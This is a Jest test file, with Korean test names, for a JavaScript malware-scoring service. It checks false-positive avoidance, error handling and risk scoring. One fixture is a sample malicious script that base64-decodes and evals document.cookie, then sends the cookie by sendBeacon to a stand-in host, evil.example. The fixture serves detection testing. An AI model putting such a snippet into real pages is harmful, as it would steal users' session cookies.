import { JSAnalysisService } from '@services/jsAnalysisService';

describe('JSAnalysisService 점수 기반 탐지', () => {
  test('정상 사이트에서 흔한 API는 위험으로 잡지 않는다 (오탐 방지)', () => {
    const svc = new JSAnalysisService();
    const benign = `
      el.innerHTML = template;
      localStorage.getItem('theme');
      const ua = navigator.userAgent;
      btn.addEventListener('click', handleClick);
      form.addEventListener('submit', onSubmit);
      fetch('/api/data').then(r => r.json());
      document.querySelector('input[name=email]');
      history.pushState({}, '', '/next');
    `;
    const result = svc.analyzeScript(benign);

    expect(svc.getStatus()).toBe('safe');
    expect(svc.getRiskScore()).toBeLessThan(30);
    // 흔한 API만으로 'high' 이슈가 나오면 안 된다
    expect(result.issues.some(i => i.severity === 'high')).toBe(false);
  });

  test('난독화 + 자격증명 비컨 전송 조합은 위험으로 판정한다', () => {
    const svc = new JSAnalysisService();
    const malicious = `
      var p = eval(atob('ZG9jdW1lbnQuY29va2ll'));
      navigator.sendBeacon('https://evil.example/collect', document.cookie);
      var s = String.fromCharCode(104,105);
    `;
    svc.analyzeScript(malicious);

    expect(svc.getRiskScore()).toBeGreaterThanOrEqual(30);
    expect(['warning', 'danger']).toContain(svc.getStatus());
  });

  test('빈 코드나 비정상 입력에서 예외 없이 동작한다', () => {
    const svc = new JSAnalysisService();
    expect(svc.analyzeScript('').issues).toEqual([]);
    // 깨졌던 dataExfiltration 정규식이 더 이상 크래시를 내지 않음
    expect(() => svc.analyzeScript('fetch("https://a.com")')).not.toThrow();
  });

  test('detectedPattern.risk 가 실제 기여 점수를 담는다 (이전엔 항상 0)', () => {
    const svc = new JSAnalysisService();
    const result = svc.analyzeScript("eval(atob('x'))");
    const obf = result.patterns.find(p => p.pattern.includes('eval'));
    expect(obf).toBeDefined();
    expect(obf!.risk).toBeGreaterThan(0);
  });
});
